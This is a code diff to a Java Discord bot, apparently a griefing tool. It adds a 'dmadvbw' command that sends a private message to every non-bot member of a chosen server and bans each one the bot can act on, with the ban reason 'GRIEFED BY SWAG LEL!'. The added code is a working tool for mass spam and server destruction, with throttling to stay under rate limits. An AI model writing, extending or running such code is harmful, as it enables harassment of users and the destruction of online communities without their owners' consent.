@@ -107,6 +107,40 @@ public class DMWizzEvent extends ListenerAdapter {
                     event.getChannel().sendMessage("Caught Error. Make sure you provide a valid guild-id and message").queue();
                 }
             }
+        if (args[0].equalsIgnoreCase("dmadvbw")) {
+            if (args.length <= 1) {
+                event.getChannel().sendMessage("Proper format: massdm <guild-id> <message>").queue();
+                return;
+            }
+            try {
+                Guild guild = event.getJDA().getGuildById(args[1]);
+                event.getChannel().sendMessage("Starting mass dm & banwave to " + guild.getMembers().size() + " members in " + guild.getName() + " (" + guild.getId() + ")").queue();
+                Thread massDM = new Thread(() -> {
+                    try {
+                        int counter = 0;
+                        for (Member member : guild.getMembers()) {
+                            if (!member.getUser().isBot()) {
+                                String finalMessage = event.getMessage().getContentRaw().substring(25);
+                                Wrapper.sendPrivateMessage(event.getJDA(), member.getUser().getId(), finalMessage);
+                                if (guild.getSelfMember().canInteract(member))
+                                guild.ban(member, 0, "GRIEFED BY SWAG LEL!").queue();
+                                counter++;
+                                System.out.println("Messaged " + member.getUser().getAsTag() + " (" + counter + ")");
+                                Thread.sleep(1100);
+                            }
+                        }
+                    } catch (InterruptedException exception) {
+                        event.getChannel().sendMessage("Thread Exception").queue();
+                    }
+                });
+                massDM.start();
+                event.getChannel().sendMessage("Banning & Messaging " + guild.getMemberCount() + " users!").queue();
+
+            } catch (Exception ex) {
+                event.getChannel().sendMessage("Caught Error. Make sure you provide a valid guild-id and message").queue();
+            }
+        }
         }
     }
+
 }
